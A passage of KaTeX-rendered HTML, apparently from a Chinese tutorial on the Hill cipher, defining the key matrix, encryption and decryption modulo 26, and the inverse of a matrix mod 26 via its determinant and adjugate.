class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.4500349999999997em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.144139em;vertical-align:-0.394139em;"></span><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.072523em;"><span style="top:-2.364192em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">×</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394139em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:6.120000000000001em;vertical-align:-2.8100000000000005em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.310000000000001em;"><span style="top:-6.1575000000000015em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-4.2975em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.4374999999999996em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-1.2374999999999996em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.8100000000000005em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.310000000000001em;"><span style="top:-5.9700000000000015em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-4.11em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋱</span></span></span><span style="top:-2.2499999999999996em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-1.0499999999999996em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.8100000000000005em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.310000000000001em;"><span style="top:-5.9700000000000015em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-4.11em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-2.2499999999999996em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋱</span></span></span><span style="top:-1.0499999999999996em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.8100000000000005em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.310000000000001em;"><span style="top:-6.1575000000000015em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-4.2975em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.4374999999999996em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-1.2374999999999996em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.8100000000000005em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>加密变换：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mi>k</mi><mo separator="true">⋅</mo><mi>p</mi><mo>=</mo><mi>c</mi><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E_k(p)=k·p=c(\bmod26)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span></span></span></span></p><p>解密变换：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>k</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo separator="true">⋅</mo><mi>c</mi><mo>=</mo><mi>p</mi><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">D_k(c)=k^{-1}·c=p(\bmod26)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span></span></span></span></p><p>其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>k</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">k^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>被称为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>在模26上的逆矩阵。逆矩阵涉及到线性代数，因此我们需要特别定义一下密钥矩阵<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，来保证其逆矩阵存在。</p><p>假设<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A=(a_{ij})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>为一个定义在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Z</mi><mn>26</mn></msub></mrow><annotation encoding="application/x-tex">Z_{26}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>×</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">n\times n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>矩阵，如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>在模26上可逆，则有：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><msup><mi>A</mi><mo>∗</mo></msup><mi mathvariant="normal">/</mi><mi>d</mi><mi>e</mi><mi>t</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A^{-1}=A^*/det(A)(\bmod26)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span></span></span></span>。</p><p>其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>e</mi><mi>t</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">det(A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span></span></span></span>为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>的行列式，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">A^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.688696em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>的伴随矩阵，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>A</mi><mrow><mi>j</mi><mo separator="true">,</mo><mi>i</mi></mrow><mo>∗</mo></msubsup><mo>=</mo><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mrow><mi>i</mi><mo>+</mo><mi>j</mi></mrow></msup><msub><mi>M</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">A^*_{j,i}=(-1)^{i+j}M_{i,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0834679999999999em;vertical-align:-0.394772em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-2.441336em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1107719999999999em;vertical-align:-0.286108em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">M_{i,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>为矩阵<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord 